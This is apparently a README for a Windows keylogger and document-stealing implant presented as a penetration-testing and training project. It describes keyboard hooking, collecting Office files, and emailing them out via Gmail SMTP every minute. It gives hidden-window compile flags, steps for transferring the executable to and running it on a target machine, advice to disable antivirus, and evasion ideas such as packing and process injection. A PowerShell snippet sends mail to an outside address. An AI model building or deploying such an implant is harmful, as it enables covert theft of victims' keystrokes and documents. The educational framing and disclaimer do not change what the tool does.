# WinAPI Malware Simulation for Security Research

A proof-of-concept Windows implant that logs keystrokes, collects Office documents, and exfiltrates them via Gmail SMTP. Built for authorized penetration testing, red team engagements, and cybersecurity education.

---

## ⚠️ Legal Notice

This tool is intended **only** for authorized security assessments on systems you own or have explicit written permission to test.

Unauthorized use is illegal. The author assumes **no liability** for misuse.

---

# ✨ Features

* **Keystroke Logging** — Captures virtual key codes using a low-level keyboard hook (`WH_KEYBOARD_LL`)
* **Document Collection** — Scans **Documents** and **Desktop** folders for `.docx` and `.xlsx` files
* **Deduplication** — Tracks previously collected files using `doc_sent.log`
* **ZIP Compression** — Compresses collected files using PowerShell's `System.IO.Compression`
* **Email Exfiltration** — Sends the keylog and ZIP archive via Gmail SMTP (TLS/587)
* **Debug Logging** — Generates timestamped debug logs
* **Persistence Ready** — Designed to run hidden (`-mwindows`) and compatible with Scheduled Tasks or Startup Folder persistence

---

# 🏗️ Architecture

```text
collector.exe
├── KeyloggerThread
│      └── Low-level keyboard hook → writes to kl.dat
│
├── Main Loop (60-second cycle)
│      ├── Collect Office documents
│      ├── Compress into ZIP
│      └── Send email via PowerShell
│
└── Debug Logger
       └── Writes execution status to collector_debug.log
```

---

# 📂 File Structure

| File                                  | Purpose                               |
| ------------------------------------- | ------------------------------------- |
| `C:\Windows\Temp\kl.dat`              | Keystroke log                         |
| `C:\Windows\Temp\kl_attachment.dat`   | Temporary attachment copy             |
| `C:\Windows\Temp\collected\`          | Staging directory                     |
| `C:\Windows\Temp\data.zip`            | ZIP archive                           |
| `C:\Windows\Temp\doc_sent.log`        | Tracks already-sent documents         |
| `C:\Windows\Temp\send_mail.ps1`       | Auto-generated PowerShell SMTP script |
| `C:\Windows\Temp\collector_debug.log` | Debug log                             |

---

# 📋 Requirements

* **Compiler:** MinGW-w64 (GCC)
* **Operating System:** Windows 7 / 10 / 11 (x64)
* **SMTP:** Gmail account with **App Password**
* **Windows Defender:** May detect the executable. Consider adding exclusions or disabling real-time protection in an isolated lab environment.

---

# ⚙️ Compilation

```powershell
gcc -o collector.exe collector.c -luser32 -lgdi32 -lshell32 -ladvapi32 -O2 -s -mwindows
```

### Compiler Flags

| Flag         | Description                    |
| ------------ | ------------------------------ |
| `-luser32`   | User32 Windows API             |
| `-lgdi32`    | Graphics Device Interface      |
| `-lshell32`  | Shell API                      |
| `-ladvapi32` | Advanced Windows API           |
| `-O2`        | Optimize for speed/size        |
| `-s`         | Strip debug symbols            |
| `-mwindows`  | Build without a console window |

---

# ⚙️ Configuration

Edit the configuration section in `collector.c`:

```c
#define SMTP_SERVER     "smtp.gmail.com"
#define SMTP_PORT       587

#define EMAIL_FROM      "youraccount@gmail.com"
#define EMAIL_TO        "target@gmail.com"

#define EMAIL_SUBJECT   "Pentest Data Collection"

#define EMAIL_USER      "youraccount@gmail.com"
#define EMAIL_PASS      "xxxx xxxx xxxx xxxx"
```

---

# 🚀 Usage

## 1. Compile

Compile the source code using MinGW.

## 2. Transfer

Transfer the executable to the target system.

Examples:

* AnyDesk
* USB
* SMB Share

## 3. Deploy

```powershell
copy collector.exe C:\ProgramData\
```

## 4. Execute

```powershell
C:\ProgramData\collector.exe
```

## 5. Verify Process

```powershell
Get-Process -Name collector
```

## 6. Check Debug Log

```powershell
Get-Content "C:\Windows\Temp\collector_debug.log"
```

---

# 🔄 Runtime Workflow

Every **60 seconds**, the application performs the following:

1. Search for new `.docx` and `.xlsx` files.
2. Copy newly discovered files.
3. Compress them into `data.zip`.
4. Attach:

   * `keylog.txt`
   * `data.zip`
5. Send via Gmail SMTP.
6. Clear the keylog.
7. Repeat.

---

# 🥷 Evasion Notes

### Antivirus

MinGW binaries are commonly detected.

Possible research topics include:

* UPX packing
* String obfuscation
* Custom encryption
* Process injection

### Firewall

Outbound SMTP (TCP/587) must be permitted.

### Gmail

Requires a Gmail **App Password** (16-character password).

---

# 🐞 Debugging

## Check Process

```powershell
Get-Process -Name collector
```

## View Debug Log

```powershell
Get-Content "C:\Windows\Temp\collector_debug.log"
```

## Verify Keylog

```powershell
Get-Item "C:\Windows\Temp\kl.dat"
```

## Verify PowerShell Script

```powershell
Test-Path "C:\Windows\Temp\send_mail.ps1"
```

## Test SMTP

```powershell
$smtp = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587)
$smtp.EnableSsl = $true
$smtp.Credentials = New-Object System.Net.NetworkCredential('youraccount@gmail.com','app-password')
$smtp.Send('youraccount@gmail.com','target@gmail.com','Test','SMTP direct test')
```

---

# ⚠️ Limitations

* Captures **Virtual Key Codes (VK)** instead of reconstructed characters.
* Depends on Gmail SMTP.
* Does **not** implement persistence by default.
* Single executable.
* No C2 framework.
* No encryption.
* No process injection.

---

# 📚 Educational Context

This project was developed as part of a **Windows API Programming** module in a cybersecurity training program.

The objective is to understand:

* Windows API programming
* Keyboard hooks
* File collection
* PowerShell automation
* SMTP communication
* Malware behavior
* Detection engineering
* Incident response

---

# 📄 License

This project is provided **for educational purposes, authorized penetration testing, and cybersecurity research only**.

Use only on systems you own or have explicit written authorization to assess.
